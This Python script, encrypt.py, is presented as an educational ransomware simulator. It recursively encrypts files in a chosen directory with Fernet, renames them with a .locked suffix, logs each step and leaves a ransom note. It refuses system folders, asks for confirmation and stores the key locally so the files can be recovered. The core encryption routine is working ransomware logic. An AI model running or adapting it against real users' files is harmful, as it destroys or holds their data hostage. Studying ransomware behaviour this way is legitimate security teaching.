# encrypt.py 
import os
import sys
from cryptography.fernet import Fernet
from datetime import datetime

# checks if you provided a target directory to attack, if not, it will use the current directory
target_dir = sys.argv[1] if len(sys.argv) > 1 else '.'

# if you attack these directories, it will not let you attack at all
DANGER_ZONES = [
    "/", "/etc", "/bin", "/usr",
    "/sys", "/proc", "/var", "/boot"
]

target_path = os.path.abspath(target_dir)
target_path = os.path.normpath(target_path)

if any(
    target_path == zone or
    target_path.startswith(zone + os.sep)
    for zone in DANGER_ZONES
):
    print("\033[91mCRITICAL ERROR: Never encrypt system folders!\033[0m")
    sys.exit(1)

# Prints this message and involve user confirmation before running the encryption code. 
print("""\033[91m
WARNING: EDUCATIONAL USE ONLY
This ransomware simulator will encrypt files in the target directory.
DO NOT run on production systems or important files!
\033[0m""")
if input("Continue? (y/n): ").lower() != 'y':
    sys.exit(0)

#creates/opens log file in append mode and writes a timestamp header, doesn't overwrite previous logs 
LOG_FILE = "ransom_simulator.log"
with open(LOG_FILE, "a") as log:
    log.write(f"\n\n--- Encryption started {datetime.now()} ---\n")

#os.walk scans the directory and all subfolders. ensuring every file will be encrypted.
files = []
for root, _, filenames in os.walk(target_dir): 
    for file in filenames:
        filepath = os.path.join(root, file)
        
        # Skip protected files and our own files
        if file in ["encrypt.py", "decrypt.py", "secret.key", LOG_FILE]:
            continue
        if file.startswith('.') or file.endswith('.locked'):
            continue
            
        files.append(filepath)
        with open(LOG_FILE, "a") as log:
            log.write(f"Discovered: {filepath}\n")

# REQUIREMENT: Encryption process
key = Fernet.generate_key()
with open(os.path.join(target_dir, "secret.key"), "wb") as keyfile:
    keyfile.write(key)

for filepath in files:
    try:
        # ENCRYPTION LOGIC - takes one file at a time from the directory and opens it in "read binary" mode which handles any file type. it then takes all the content and encrypts it using fernet and writes it back to the file
        with open(filepath, "rb") as thefile:
            contents = thefile.read()
        contents_encrypted = Fernet(key).encrypt(contents)
        with open(filepath, "wb") as thefile:
            thefile.write(contents_encrypted)
            
        # after writing back to the file, it will rename the file to .locked
        os.rename(filepath, filepath + ".locked")
        
        # LOGGING LOGIC - opens the log file in append mode. if the log file doesn't exist it creates it. if it already exists, it will add the new logs without deleting the old logs.
        with open(LOG_FILE, "a") as log:
            log.write(f"Encrypted: {filepath}\n")
    except Exception as e:
        with open(LOG_FILE, "a") as log:
            log.write(f"ERROR with {filepath}: {str(e)}\n")

# Ransomware note
RANSOM_NOTE = f"""Your files have been encrypted!

Simulation run at: {datetime.now()}
{len(files)} files were encrypted.

This is an educational exercise. To decrypt:
1. Place decrypt.py and secret.key in this directory
2. Run: python decrypt.py

DO NOT PAY REAL RANSOM!
"""
#creates the ransom note in the folder and writes the RANSOM_NOTE text. Uses "w" mode which overwrites if the file already exists
with open(os.path.join(target_dir, "README_RANSOM.txt"), "w") as note:
    note.write(RANSOM_NOTE)

#len(files) counts how many files were encrypted
print(f"Simulation complete! {len(files)} files encrypted.")
